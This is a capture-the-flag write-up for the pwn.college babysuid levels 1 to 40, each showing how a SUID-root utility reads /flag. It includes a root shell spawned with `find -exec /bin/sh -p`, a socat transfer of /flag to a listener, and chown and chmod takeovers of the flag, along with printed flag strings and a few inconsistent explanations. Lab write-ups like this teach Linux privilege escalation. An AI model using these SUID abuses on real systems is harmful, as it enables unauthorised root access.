---
custom_edit_url: null
pagination_next: null
pagination_prev: null
---

## level 1

> Lets you directly read the flag!

```
hacker@program-misuse~level1:/$ /challenge/babysuid_level1
Welcome to /challenge/babysuid_level1!

This challenge is part of a series of programs that
exposes you to very simple programs that let you directly read the flag.

I just set the SUID bit on /usr/bin/cat.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level1) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/cat!
```

Let's just `cat` the flag.

```
hacker@program-misuse~level1:/$ cat /flag 
pwn.college{wsAxEwjFa6XE29_sqUPYuPmYHNs.01M0EDL4ITM0EzW}
```

&nbsp;

## level 2

> Lets you directly read the flag!

```
hacker@program-misuse~level2:/$ /challenge/babysuid_level2 
Welcome to /challenge/babysuid_level2!

This challenge is part of a series of programs that
exposes you to very simple programs that let you directly read the flag.

I just set the SUID bit on /usr/bin/more.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level2) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/more!
```

The `more` utility is used to view the text files in the command prompt, displaying one screen at a time in case the file is large

```
hacker@program-misuse~level2:/$ more /flag 
pwn.college{8nKR5pz91-h1cYlHhZmDBmfVinu.0FN0EDL4ITM0EzW}
```

&nbsp;

## level 3

> Lets you directly read the flag!

```
hacker@program-misuse~level3:/$ /challenge/babysuid_level3 
Welcome to /challenge/babysuid_level3!

This challenge is part of a series of programs that
exposes you to very simple programs that let you directly read the flag.

I just set the SUID bit on /usr/bin/less.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level3) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/less!
```

```
hacker@program-misuse~level3:/$ less /flag 

pwn.college{IX-08qc07NdQNs4pFqSr_dS4pJG.0VN0EDL4ITM0EzW}
```

&nbsp;

## level 4

> Lets you directly read the flag!

```
hacker@program-misuse~level4:/$ /challenge/babysuid_level4 
Welcome to /challenge/babysuid_level4!

This challenge is part of a series of programs that
exposes you to very simple programs that let you directly read the flag.

I just set the SUID bit on /usr/bin/tail.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level4) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/tail!
```

```
hacker@program-misuse~level4:/$ tail /flag 
pwn.college{EdUnBdQarvdiF0S9pEJ-LBK33mq.0lN0EDL4ITM0EzW}
```

&nbsp;

## level 5

> Lets you directly read the flag!

```
hacker@program-misuse~level5:/$ /challenge/babysuid_level5 
Welcome to /challenge/babysuid_level5!

This challenge is part of a series of programs that
exposes you to very simple programs that let you directly read the flag.

I just set the SUID bit on /usr/bin/head.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level5) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/head!
```

```
hacker@program-misuse~level5:/$ head /flag 
pwn.college{YzzTOJP1xGlO7nuc1YKF-b3tyQu.01N0EDL4ITM0EzW}
```

&nbsp;

## level 6

> Lets you directly read the flag!

```
hacker@program-misuse~level6:/$ /challenge/babysuid_level6 
Welcome to /challenge/babysuid_level6!

This challenge is part of a series of programs that
exposes you to very simple programs that let you directly read the flag.

I just set the SUID bit on /usr/bin/sort.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level6) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/sort!
```

```
hacker@program-misuse~level6:/$ sort /flag 
pwn.college{424r1v3bMVGyh9RLT3TPFUn6vzP.0FO0EDL4ITM0EzW}
```

&nbsp;

## level 7

> Shows you that an over-privileged editor is a very powerful tool!

```
hacker@program-misuse~level7:/$ /challenge/babysuid_level7 
Welcome to /challenge/babysuid_level7!

This challenge is part of a series of programs that
shows you that an over-privileged editor is a very powerful tool, indeed.

I just set the SUID bit on /usr/bin/vim.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level7) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/vim!
```

```
hacker@program-misuse~level7:/$ vim /flag 

pwn.college{gx5H5-oxrvCQYt3U9LZgWzbW5Re.0VO0EDL4ITM0EzW}
```

&nbsp;

## level 8

> Shows you that an over-privileged editor is a very powerful tool!

```
hacker@program-misuse~level8:/$ /challenge/babysuid_level8 
Welcome to /challenge/babysuid_level8!

This challenge is part of a series of programs that
shows you that an over-privileged editor is a very powerful tool, indeed.

I just set the SUID bit on /usr/bin/emacs.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level8) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/emacs!
```

```
hacker@program-misuse~level8:/$ emacs /flag

pwn.college{kse2iad59hGE3OJL91WDb6bjJ2W.0FM1EDL4ITM0EzW}
```

&nbsp;

## level 9

> Shows you that an over-privileged editor is a very powerful tool!

```
hacker@program-misuse~level9:/$ /challenge/babysuid_level9 
Welcome to /challenge/babysuid_level9!

This challenge is part of a series of programs that
shows you that an over-privileged editor is a very powerful tool, indeed.

I just set the SUID bit on /usr/bin/nano.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level9) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/nano!
```

```
hacker@program-misuse~level9:/$ nano /flag 

pwn.college{0f1RguaQ0sFq3643o1uhyieg6zY.0VM1EDL4ITM0EzW}
```

&nbsp;

## level 10

> Requires you to understand their output to derive the flag from it!

```
hacker@program-misuse~level10:/$ /challenge/babysuid_level10 
Welcome to /challenge/babysuid_level10!

This challenge is part of a series of programs that
require you to understand their output to derive the flag from it.

I just set the SUID bit on /usr/bin/rev.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level10) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/rev!
```

The `rev` utility reverses the order of characters within a file.

```
hacker@program-misuse~level10:/$ rev /flag 
}WzE0MTI4LDE1Ml0.J_y9MmwFrNTr99k0Od4u8_x4llw{egelloc.nwp
```

As we can see, the flag is reversed. In order to get the correct ordered flag, we have to pipe the above command with another `rev`.

```
hacker@program-misuse~level10:/$ rev /flag | rev
pwn.college{wll4x_8u4dO0k99rTNrFwmM9y_J.0lM1EDL4ITM0EzW}
```

&nbsp;

## level 11

> Requires you to understand their output to derive the flag from it!

```
hacker@program-misuse~level11:/$ /challenge/babysuid_level11 
Welcome to /challenge/babysuid_level11!

This challenge is part of a series of programs that
require you to understand their output to derive the flag from it.

I just set the SUID bit on /usr/bin/od.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level11) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/od!
```

The `od` utility gives an octal dump of the data provided through STDIN.

```
hacker@program-misuse~level11:/$ /challenge/babysuid_level11 
Welcome to /challenge/babysuid_level11!

This challenge is part of a series of programs that
require you to understand their output to derive the flag from it.

I just set the SUID bit on /usr/bin/od.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level11) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/od!
hacker@program-misuse~level11:/$ od /flag 
0000000 073560 027156 067543 066154 063545 075545 041163 050514
0000020 053560 073501 052067 042107 033546 064131 053063 065125
0000040 066527 067521 060552 027160 030460 030515 042105 032114
0000060 052111 030115 075105 076527 000012
0000071
```

If we provide the `-c` option, `od` will dump the ASCII representation.

```
hacker@program-misuse~level11:/$ od -c /flag 
0000000   p   w   n   .   c   o   l   l   e   g   e   {   s   B   L   Q
0000020   p   W   A   w   7   T   G   D   f   7   Y   h   3   V   U   j
0000040   W   m   Q   o   j   a   p   .   0   1   M   1   E   D   L   4
0000060   I   T   M   0   E   z   W   }  \n
0000071
```

&nbsp;

## level 12

> Requires you to understand their output to derive the flag from it!

```
hacker@program-misuse~level12:/$ /challenge/babysuid_level12 
Welcome to /challenge/babysuid_level12!

This challenge is part of a series of programs that
require you to understand their output to derive the flag from it.

I just set the SUID bit on /usr/bin/hd.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level12) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/hd!
```

The `od` utility gives an hexadecimal dump of the data provided through STDIN.

```
hacker@program-misuse~level12:/$ hd /flag 
00000000  70 77 6e 2e 63 6f 6c 6c  65 67 65 7b 34 48 64 41  |pwn.college{4HdA|
00000010  47 32 32 70 5f 68 75 42  4d 63 2d 69 4d 35 72 38  |G22p_huBMc-iM5r8|
00000020  32 5a 4b 69 52 63 70 2e  30 46 4e 31 45 44 4c 34  |2ZKiRcp.0FN1EDL4|
00000030  49 54 4d 30 45 7a 57 7d  0a                       |ITM0EzW}.|
00000039
```

&nbsp;

## level 13

> Requires you to understand their output to derive the flag from it!

```
hacker@program-misuse~level13:/$ /challenge/babysuid_level13 
Welcome to /challenge/babysuid_level13!

This challenge is part of a series of programs that
require you to understand their output to derive the flag from it.

I just set the SUID bit on /usr/bin/xxd.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level13) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/xxd!
```

The `xxd` creates a hex dump of the input provided through STDIN.

```
hacker@program-misuse~level13:/$ xxd /flag 
00000000: 7077 6e2e 636f 6c6c 6567 657b 4d58 3876  pwn.college{MX8v
00000010: 4870 3454 724c 5a50 7735 5070 3579 7a68  Hp4TrLZPw5Pp5yzh
00000020: 5130 724a 6753 412e 3056 4e31 4544 4c34  Q0rJgSA.0VN1EDL4
00000030: 4954 4d30 457a 577d 0a                   ITM0EzW}.
```

&nbsp;

## level 14

> Requires you to understand their output to derive the flag from it!

```
hacker@program-misuse~level14:/$ /challenge/babysuid_level14 
Welcome to /challenge/babysuid_level14!

This challenge is part of a series of programs that
require you to understand their output to derive the flag from it.

I just set the SUID bit on /usr/bin/base32.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level14) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/base32!
```

The `base32` utility can be used to Base32 encode or decode data.

```
hacker@program-misuse~level14:/$ base32 /flag 
OB3W4LTDN5WGYZLHMV5U25DGNZ4FQRLRI5IUWTCMMRDF65DMHA3EQYTBKJVFKRJOGBWE4MKFIRGD
ISKUJUYEK6SXPUFA====
```

We can decode this string using the `-d` option.

```
hacker@program-misuse~level14:/$ base32 /flag | base32 -d
pwn.college{MtfnxXEqGQKLLdF_tl86HbaRjUE.0lN1EDL4ITM0EzW}
```

&nbsp;

## level 15

> Requires you to understand their output to derive the flag from it!

```
hacker@program-misuse~level15:/$ /challenge/babysuid_level15 
Welcome to /challenge/babysuid_level15!

This challenge is part of a series of programs that
require you to understand their output to derive the flag from it.

I just set the SUID bit on /usr/bin/base64.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level15) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/base64!
```

The `base64` utility can be used to Base64 encode or decode data.

```
hacker@program-misuse~level15:/$ base64 /flag 
cHduLmNvbGxlZ2V7Z2N5Qm45MDR5anV0U3NUMVNJdWRQdkVDYkFYLjAxTjFFREw0SVRNMEV6V30K
```

We can decode the string using the `-d` option.

```
hacker@program-misuse~level15:/$ base64 /flag | base64 -d
pwn.college{gcyBn904yjutSsT1SIudPvECbAX.01N1EDL4ITM0EzW}
```

&nbsp;

## level 16

> Requires you to understand their output to derive the flag from it!

```
hacker@program-misuse~level16:/$ /challenge/babysuid_level16 
Welcome to /challenge/babysuid_level16!

This challenge is part of a series of programs that
require you to understand their output to derive the flag from it.

I just set the SUID bit on /usr/bin/split.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level16) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/split!
```

The `split` utility splits the given data based on the buffer size that is set.

The `-u` option prints an unbuffered stream of data.

```
hacker@program-misuse~level16:~$ split -x /flag 
```

```
hacker@program-misuse~level16:~$ cat xaa 
pwn.college{IfP-xYu2eJm9Nv42kckLl_-gZB6.0FO1EDL4ITM0EzW}
```

&nbsp;

## level 17

> Forces you to understand different archive formats!

```
hacker@program-misuse~level17:/$ /challenge/babysuid_level17 
Welcome to /challenge/babysuid_level17!

This challenge is part of a series of programs that
force you to understand different archive formats.

I just set the SUID bit on /usr/bin/gzip.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level17) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/gzip!
hacker@program-misuse~level17:/$ 
```

The `gzip` utility compresses the file provided to it using Lempel-Ziv coding.

```
hacker@program-misuse~level17:/$ gzip /flag 
```

We can use the `-d` option to decompress the `flag.gz` file. Also, we can use the `-c` option to print its content to STDOUT.

```
hacker@program-misuse~level17:/$ gzip -c -d /flag.gz 
pwn.college{gynggllL2Y5JMpbEmSTxqgmxq5u.0VO1EDL4ITM0EzW}
```

&nbsp;

## level 18

> Forces you to understand different archive formats!

```
hacker@program-misuse~level18:/$ /challenge/babysuid_level18 
Welcome to /challenge/babysuid_level18!

This challenge is part of a series of programs that
force you to understand different archive formats.

I just set the SUID bit on /usr/bin/bzip2.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level18) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/bzip2!
```

The `bzip2` utility compresses files using the Burrows-Wheeler block sorting text compression algorithm, and Huffman coding.

We can use the `-c` option to print its content to STDOUT. Also, we can use the `-d` option to decompress the `flag.gz` file

```
hacker@program-misuse~level18:/$ bzip2 -c /flag | bzip2 -d
pwn.college{w1Xvr76rk_xB4leFxLepgpgIcqS.0FM2EDL4ITM0EzW}
```

&nbsp;

## level 19

> Forces you to understand different archive formats!

```
hacker@program-misuse~level19:/$ /challenge/babysuid_level19 
Welcome to /challenge/babysuid_level19!

This challenge is part of a series of programs that
force you to understand different archive formats.

I just set the SUID bit on /usr/bin/zip.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level19) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/zip!
```

The `zip` is a compression and file packaging utility for Unix, VMS, MSDOS, OS/2, Windows 9x/NT/XP, Minix, Atari, Macintosh, Amiga, and Acorn RISC OS.

In order to use it, we have to specify a destination file as well.

```
hacker@program-misuse~level19:/$ zip /flag.zip /flag && cat /flag.zip 
PK
�#�X�uJv99flagUT        �#Lf�|<fux
                                  pwn.college{8DPXd8lN7NEudFrIQpNG9hUJaqj.0VM2EDL4ITM0EzW}
PK
�#�X�uJv99�flagUT�#Lfux
                       PKJw
```

&nbsp;

## level 20

> Forces you to understand different archive formats!

```
hacker@program-misuse~level20:/$ /challenge/babysuid_level20 
Welcome to /challenge/babysuid_level20!

This challenge is part of a series of programs that
force you to understand different archive formats.

I just set the SUID bit on /usr/bin/tar.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level20) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/tar!
```

The `tar` utility is an archiving program designed to store multiple files in a single file (an archive), and to manipulate such archives.

```
hacker@program-misuse~level20:/$ tar -cvf flag.tar /flag && cat flag.tar
flag0000400000000000000000000000007114623022621010372 0ustar  rootrootpwn.college{s9sidrdyxkAHF8Y1S9VWKTkIX-q.0lM2EDL4ITM0EzW}
```

&nbsp;

## level 21

> Forces you to understand different archive formats!

```
hacker@program-misuse~level21:/$ /challenge/babysuid_level21 
Welcome to /challenge/babysuid_level21!

This challenge is part of a series of programs that
force you to understand different archive formats.

I just set the SUID bit on /usr/bin/ar.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level21) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/ar!
```

The `ar` program creates, modifies, and extracts from archives.

We can specify the output file using the `r` option.

```
hacker@program-misuse~level21:/$ ar r /flag.a /flag && cat /flag.a
!<arch>
flag/           0           0     0     644     57        `
pwn.college{woCBjZxtFgTiFHiuVetB5jxHNA9.01M2EDL4ITM0EzW}
```

&nbsp;

## level 22

```
hacker@program-misuse~level22:/$ /challenge/babysuid_level22 
Welcome to /challenge/babysuid_level22!

This challenge is part of a series of programs that
force you to understand different archive formats.

I just set the SUID bit on /usr/bin/cpio.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level22) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/cpio!
```

The `cpio` utility can be copy files between archives.

We can use the `find` command for the `/flag` , pipe it with `cpio` and redirect the output to the `flag.cpio` file.

```
hacker@program-misuse~level22:~$ find /flag | cpio -o > flag.cpio && cat flag.cpio
�q�6��Lf$]9/flagpwn.college{c8TW4WzvJeYLfeelegwkGAs19gj.0FN2EDL4ITM0EzW}
�q
```

&nbsp;

## level 23

> Forces you to understand different archive formats!

```
hacker@program-misuse~level23:/$ /challenge/babysuid_level23 
Welcome to /challenge/babysuid_level23!

This challenge is part of a series of programs that
force you to understand different archive formats.

I just set the SUID bit on /usr/bin/genisoimage.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level23) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/genisoimage!
```

The `genisoimage` utility creates filesystem images.

In order to retrieve the flag, we have to use the following script:

```
hacker@program-misuse~level23:/$ for option in $(genisoimage --help 2>&1 | grep FILE | awk {'print $1'}); do echo $option; genisoimage $option /flag 2>&1 | grep pwn; done
-abstract
-biblio
-check-session
-copyright
-b

-B
-sunx86-boot
-G
-c
-hide
-hide-list
-hidden
-hidden-list
-hide-joliet
-hide-joliet-list
-i
-log-file
-m
-exclude-list
-M
-o
-path-list
-alpha-boot
-hppa-kernel-32
-hppa-kernel-64
-hppa-bootloader
-hppa-ramdisk
-mips-boot
-mipsel-boot
-jigdo-jigdo
-jigdo-template
-md5-list
-sort
        pwn.college{U9gdkhJMpmaflhZ8oo-CxkYWqSw.0VN2EDL4ITM0EzW}
-stream-file-name
-x
-map
-H
-magic
-boot-hfs-file
-auto
-hide-hfs
-hide-hfs-list
-root-info
-prep-boot
```

&nbsp;

## level 24

> Enables you to read flags by making them execute other commands!

```
hacker@program-misuse~level24:/$ /challenge/babysuid_level24 
Welcome to /challenge/babysuid_level24!

This challenge is part of a series of programs that
will enable you to read flags by making them execute other commands.

I just set the SUID bit on /usr/bin/env.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level24) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/env!
```

The `env` utility sets the environment for another command.

We can pair it with `cat` to read the flag.

```
hacker@program-misuse~level24:/$ env cat /flag
pwn.college{8cax-uXsZg9PnorqYrp77HUbbRK.0lN2EDL4ITM0EzW}
```

&nbsp;

## level 25

> Enables you to read flags by making them execute other commands!

```
hacker@program-misuse~level25:/$ /challenge/babysuid_level25 
Welcome to /challenge/babysuid_level25!

This challenge is part of a series of programs that
will enable you to read flags by making them execute other commands.

I just set the SUID bit on /usr/bin/find.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level25) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/find!
```

```
hacker@program-misuse~level25:~$ find . -exec /bin/sh -p \; 
#
```

```
# cat /flag
cat: /flagcat: No such file or directory
pwn.college{UsQ6vfq4dFoZ1Q5jlesvmOxUwqA.01N2EDL4ITM0EzW}
```

&nbsp;

## level 26

> Enables you to read flags by making them execute other commands!

```
hacker@program-misuse~level26:/$ /challenge/babysuid_level26 
Welcome to /challenge/babysuid_level26!

This challenge is part of a series of programs that
will enable you to read flags by making them execute other commands.

I just set the SUID bit on /usr/bin/make.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level26) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/make!
```

The  `make`  utility will determine automatically which pieces of a large program need to be recompiled, and issue the commands to recompile them.

Any command we specify within the `Makefile` is executed.

```
all:
	cat /flag
```

In order to execute the `Makefile`, we have to run the `make` command in the same directory as the file.

```
hacker@program-misuse~level26:~$ make
cat /flag
pwn.college{8bi1fE5_8eibNGb1Yc5D264ZZgx.0FO2EDL4ITM0EzW}
```

&nbsp;

## level 27

> Enables you to read flags by making them execute other commands!

```
hacker@program-misuse~level27:/$ /challenge/babysuid_level27 
Welcome to /challenge/babysuid_level27!

This challenge is part of a series of programs that
will enable you to read flags by making them execute other commands.

I just set the SUID bit on /usr/bin/nice.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level27) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/nice!
```

The `nice` utility ca be used to adjust the process scheduling. 

```
hacker@program-misuse~level27:/$ nice cat /flag 
pwn.college{EaXmDDsfhaj9gThFrAMx8d1dNhL.0VO2EDL4ITM0EzW}
```

&nbsp;

## level 28

> Enables you to read flags by making them execute other commands!

```
hacker@program-misuse~level28:/$ /challenge/babysuid_level28 
Welcome to /challenge/babysuid_level28!

This challenge is part of a series of programs that
will enable you to read flags by making them execute other commands.

I just set the SUID bit on /usr/bin/timeout.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level28) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/timeout!
```

The `timeout` utility sets a time limit on the execution of a command.

```
hacker@program-misuse~level28:/$ timeout 1 cat /flag
pwn.college{AAH2gMozSqX9aTkrJafBTkAnluZ.0FM3EDL4ITM0EzW}
```

&nbsp;

## level 29

> Enables you to read flags by making them execute other commands!

```
hacker@program-misuse~level29:/$ /challenge/babysuid_level29 
Welcome to /challenge/babysuid_level29!

This challenge is part of a series of programs that
will enable you to read flags by making them execute other commands.

I just set the SUID bit on /usr/bin/stdbuf.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level29) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/stdbuf!
```

The `stdbuf` utility adjusts buffering options for a command.

We can use the `-oL` option to 

```
hacker@program-misuse~level29:~$ stdbuf -i0 cat /flag
pwn.college{slt066NKIqYy9YOjmwJZmI-H-Bn.0VM3EDL4ITM0EzW}
```

&nbsp;

## level 30

> Enables you to read flags by making them execute other commands!

```
hacker@program-misuse~level30:/$ /challenge/babysuid_level30 
Welcome to /challenge/babysuid_level30!

This challenge is part of a series of programs that
will enable you to read flags by making them execute other commands.

I just set the SUID bit on /usr/bin/setarch.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level30) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/setarch!
```

The `setarch` utility sets the architecture for a command.

```
hacker@program-misuse~level30:/$ setarch -R cat /flag 
pwn.college{gGdPhvv9sM-866Xr_x9kgE1Q6Ho.0lM3EDL4ITM0EzW}
```

&nbsp;

## level 31

> Enables you to read flags by making them execute other commands!

```
hacker@program-misuse~level31:/$ /challenge/babysuid_level31 
Welcome to /challenge/babysuid_level31!

This challenge is part of a series of programs that
will enable you to read flags by making them execute other commands.

I just set the SUID bit on /usr/bin/watch.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level31) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/watch!
```

The `watch` utility repeats a command at specified intervals.

```
watch -x cat /flag
```

&nbsp;

## level 32

> Enables you to read flags by making them execute other commands!

```
hacker@program-misuse~level32:/$ /challenge/babysuid_level32 
Welcome to /challenge/babysuid_level32!

This challenge is part of a series of programs that
will enable you to read flags by making them execute other commands.

I just set the SUID bit on /usr/bin/socat.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level32) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/socat!
```

The `socat` utility establishes two bidirectional byte streams and transfers data between them.

Let us set up a `nc` listener on port 80.

```
hacker@program-misuse~level32:/$ nc -nlvp 80
Listening on 0.0.0.0 80
```

Now, using `socat`, we can send the contents of `/flag` over port 80.

```
hacker@program-misuse~level32:/$ socat -u file:/flag tcp-connect:localhost:80
```

```
hacker@program-misuse~level32:/$ nc -nlvp 80
Listening on 0.0.0.0 80
Connection received on 127.0.0.1 38380
pwn.college{IGdVOWBVj8s11y7C02rRu8d7x-2.0FN3EDL4ITM0EzW}
```

&nbsp;

## level 33

> Requires some light programming to read the flag.!

```
hacker@program-misuse~level33:/$ /challenge/babysuid_level33 
Welcome to /challenge/babysuid_level33!

This challenge is part of a series of programs that
will require some light programming to read the flag..

I just set the SUID bit on /usr/bin/whiptail.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level33) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/whiptail!
```

The `whiptail` utility allows us to present a variety of questions or display messages using dialog boxes from a shell script.

```
hacker@program-misuse~level33:/$ whiptail --textbox --scrolltext "$LFILE" 10 50
```

![Pasted image 20240521173223](https://github.com/Kunull/Write-ups/assets/110326359/cde0c0e1-ab97-478a-97df-97377db0d0dd)

&nbsp;

## level 34

> Requires some light programming to read the flag.!

```
hacker@program-misuse~level34:/$ /challenge/babysuid_level34 
Welcome to /challenge/babysuid_level34!

This challenge is part of a series of programs that
will require some light programming to read the flag..

I just set the SUID bit on /usr/bin/awk.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level34) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/awk
```

The AWK language is useful for manipulation of data files, text retrieval and processing, and for prototyping and experimenting with algorithms.

We can use this language to read the `/flag` file and print the content to the STDOUT.

```
hacker@program-misuse~level34:/$ awk '{print $0}' /flag
pwn.college{EUO4MsZI3ZvMuY6iJ0PEk9J9LyZ.0lN3EDL4ITM0EzW}
```

&nbsp;

## level 35

```
hacker@program-misuse~level35:/$ /challenge/babysuid_level35 
Welcome to /challenge/babysuid_level35!

This challenge is part of a series of programs that
will require some light programming to read the flag..

I just set the SUID bit on /usr/bin/sed.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level35) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/sed!
```

`sed` is a stream editor that can be used to perform basic string transformation on data. It makes only one pass over the  input.

```
hacker@program-misuse~level35:/$ sed 's/""/""/' /flag
pwn.college{sCx2elKgYSY2WxAd5rOKYBtJeCC.01N3EDL4ITM0EzW}
```

&nbsp;

## level 36

```
hacker@program-misuse~level36:/$ /challenge/babysuid_level36 
Welcome to /challenge/babysuid_level36!

This challenge is part of a series of programs that
will require some light programming to read the flag..

I just set the SUID bit on /usr/bin/ed.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level36) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/ed!
```

`ed` is a line-oriented text editor. It is used to create, display, modify and otherwise manipulate text files, both interactively and via shell scripts. It makes multiple passes over the input.

```
hacker@program-misuse~level36:/$ ed -v /flag
57

```

The stream has been opened. We can now type `p` to retrieve the flag which starts with P and then type `q` to quit.

```
p
pwn.college{wXtf1Ad-tydBVABAHvjcoTSCfif.0FO3EDL4ITM0EzW}
q
```

&nbsp;

## level 37

```
hacker@program-misuse~level37:/$ /challenge/babysuid_level37 
Welcome to /challenge/babysuid_level37!

This challenge is part of a series of programs that
let you get the flag by doing tricks with permissions.

I just set the SUID bit on /usr/bin/chown.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level37) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/chown!
```

The `chown` utility changes the user and/or group ownership of each given file.

```
hacker@program-misuse~level37:/$ chown hacker /flag && cat /flag 
pwn.college{kQyPS6XzM4VDmxQVQoqSnBGc-Do.0VO3EDL4ITM0EzW}
```

&nbsp;

## level 38

```
hacker@program-misuse~level38:/$ /challenge/babysuid_level38 
Welcome to /challenge/babysuid_level38!

This challenge is part of a series of programs that
let you get the flag by doing tricks with permissions.

I just set the SUID bit on /usr/bin/chmod.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level38) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/chmod!
```

The `chmod` changes the file mode bits of each given file.

```
hacker@program-misuse~level38:/$ chmod 777 /flag && cat /flag 
pwn.college{Q0ekC2AcNwaGlprAcbhGuGundVV.0FM4EDL4ITM0EzW}
```

&nbsp;

## level 39

```
hacker@program-misuse~level39:/$ /challenge/babysuid_level39 
Welcome to /challenge/babysuid_level39!

This challenge is part of a series of programs that
let you get the flag by doing tricks with permissions.

I just set the SUID bit on /usr/bin/cp.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level39) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/cp!
```

The `cp` utility copies a file to the specified destination.

We know that the `/home/hacker` directory is a persistent one, i.e. every file in this directory is unmodified through all the levels. Knowing this, we can copy the `/flag` to this directory.

```
hacker@program-misuse~level39:~$ cp /flag flag.copy
```

Now, we can load level 1, and just `cat` the `flag.copy` file.

```
hacker@program-misuse~level1:~$ cat flag.copy
pwn.college{cvUhsBpzWmZXH_UFdl-5k8tsU80.0VM4EDL4ITM0EzW}
```

&nbsp;

## level 40 

```
hacker@program-misuse~level40:/$ /challenge/babysuid_level40 
Welcome to /challenge/babysuid_level40!

This challenge is part of a series of programs that
let you get the flag by doing tricks with permissions.

I just set the SUID bit on /usr/bin/mv.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level40) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/mv!
```

The `mv` utility moves the specified file to the specified destination.

We know that the `/home/hacker` directory is a persistent one, i.e. every file in this directory is unmodified through all the levels. Knowing this, we can copy the `/flag` to this directory.

```
hacker@program-misuse~level40:~$ mv /flag flag.move
```

Now, we can load level 1, and just `cat` the `flag.copy` file.

```
hacker@program-misuse~level1:~$ cat flag.move
pwn.college{cvUhsBpzWmZXH_UFdl-5Sd3uF25.0VM4EDL4ITM0EzW}
```

&nbsp;

## level 41

```
